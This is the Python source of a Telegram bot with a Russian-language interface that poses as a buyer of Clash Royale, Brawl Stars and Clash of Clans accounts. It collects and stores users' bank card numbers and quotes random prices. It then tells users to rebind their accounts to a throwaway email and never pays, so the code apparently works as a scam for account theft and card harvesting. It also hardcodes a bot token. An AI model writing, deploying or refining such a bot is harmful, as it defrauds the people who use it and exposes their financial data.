import asyncio
import logging
import random
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import aiosqlite

TOKEN = "8673948593:AAGr2QXNGPTYdJWJBNJFE6KfB-ZwQIaTWP8"
ADMIN_ID = 8266829782

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

DB_NAME = "bot.db"

GAMES = {"cr": "Clash Royale", "bs": "Brawl Stars", "coc": "Clash of Clans"}

class SellStates(StatesGroup):
    waiting_card = State()
    waiting_tag = State()

async def init_db():
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, card TEXT, balance INTEGER DEFAULT 0, timestamp TEXT)''')
        await db.execute('''CREATE TABLE IF NOT EXISTS sales (id INTEGER PRIMARY KEY, user_id INTEGER, username TEXT, card TEXT, game TEXT, tag TEXT, price INTEGER, email TEXT, code TEXT, status TEXT DEFAULT 'new', timestamp TEXT)''')
        await db.commit()

async def save_user_card(user_id: int, username: str, card: str):
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute('INSERT OR REPLACE INTO users (user_id, username, card, timestamp) VALUES (?, ?, ?, ?)', (user_id, username, card, datetime.now().isoformat()))
        await db.commit()

async def get_user_profile(user_id: int):
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT username, card, balance FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            return row if row else (None, None, 0)

def game_kb():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Clash Royale", callback_data="game_cr")],[InlineKeyboardButton(text="Brawl Stars", callback_data="game_bs")],[InlineKeyboardButton(text="Clash of Clans", callback_data="game_coc")]])

def sell_kb(price):
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"Продать за {price}₽", callback_data=f"sell_{price}")],[InlineKeyboardButton(text="Отмена", callback_data="cancel")]])

def code_kb():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Получить код", callback_data="get_code")],[InlineKeyboardButton(text="Отмена", callback_data="cancel")]])

@dp.message(Command("start"))
async def start(msg: types.Message, state: FSMContext):
    await state.clear()
    await msg.answer("💳 Введите номер своей карты\nПример: 1234 1234 1234 1234", parse_mode="Markdown")
    await state.set_state(SellStates.waiting_card)

@dp.message(SellStates.waiting_card)
async def process_card(msg: types.Message, state: FSMContext):
    card = msg.text.strip().replace(" ", "")
    if len(card) < 13 or not card.isdigit():
        return await msg.answer("❌ Неверный формат. Попробуйте ещё раз.")
    await save_user_card(msg.from_user.id, msg.from_user.username or "no_username", card)
    await msg.answer("✅ Карта сохранена!\n\nВыберите игру:", reply_markup=game_kb())

@dp.callback_query(F.data.startswith("game_"))
async def choose_game(clb: types.CallbackQuery, state: FSMContext):
    game_key = clb.data.split("_")[1]
    game_name = GAMES[game_key]
    await state.update_data(game=game_key, game_name=game_name)
    await clb.message.edit_text(f"✅ Выбрано: **{game_name}**\n\nОтправьте тег аккаунта:", parse_mode="Markdown")
    await state.set_state(SellStates.waiting_tag)

@dp.message(SellStates.waiting_tag)
async def process_tag(msg: types.Message, state: FSMContext):
    tag = msg.text.strip().replace("#", "").upper()
    data = await state.get_data()
    price = random.randint(500, 6500)
    await state.update_data(tag=tag, price=price)
    await msg.answer(f"🔍 **{data['game_name']}** — тег `{tag}`\n\nЦена: **{price}₽**", reply_markup=sell_kb(price), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("sell_"))
async def start_sell(clb: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    email = f"acc{random.randint(10000,99999)}@tempmail.org"
    await state.update_data(email=email)
    await clb.message.edit_text(f"📧 Перепривяжите аккаунт на:\n\n`{email}`", reply_markup=code_kb(), parse_mode="Markdown")

@dp.callback_query(F.data == "get_code")
async def get_code(clb: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    code = random.randint(100000, 999999)
    await clb.message.edit_text(f"✅ Код: `{code}`", parse_mode="Markdown")

@dp.callback_query(F.data == "cancel")
async def cancel(clb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await clb.message.edit_text("❌ Отменено. /start")

@dp.message(Command("profile"))
async def profile(msg: types.Message):
    username, card, balance = await get_user_profile(msg.from_user.id)
    card_display = card if card else "-"
    await msg.answer(f"👤 **Профиль**\n\nНик: @{username or 'нет'}\nКарта: `{card_display}`\nБаланс: **{balance}₽**", parse_mode="Markdown")

async def main():
    await init_db()
    print("🤖 Бот запущен на Railway!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
